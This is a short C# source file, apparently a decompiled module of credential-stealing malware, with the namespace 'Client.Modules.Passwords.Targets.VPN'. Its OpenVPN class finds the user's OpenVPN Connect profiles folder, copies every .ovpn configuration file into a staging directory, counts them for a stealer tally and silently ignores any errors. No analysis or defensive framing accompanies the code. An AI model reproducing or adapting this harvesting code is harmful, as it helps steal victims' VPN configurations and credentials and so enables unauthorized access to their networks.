using System;
using System.IO;
using Client.Modules.Passwords.Helpers;

namespace Client.Modules.Passwords.Targets.VPN;

internal sealed class OpenVPN
{
	public static void Save(string sSavePath)
	{
		string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "OpenVPN Connect\\profiles");
		if (!Directory.Exists(path))
		{
			return;
		}
		try
		{
			Directory.CreateDirectory(sSavePath + "\\profiles");
			string[] files = Directory.GetFiles(path);
			foreach (string text in files)
			{
				if (Path.GetExtension(text)!.Contains("ovpn"))
				{
					Counter.VPN++;
					File.Copy(text, Path.Combine(sSavePath, "profiles\\" + Path.GetFileName(text)));
				}
			}
		}
		catch
		{
		}
	}
}
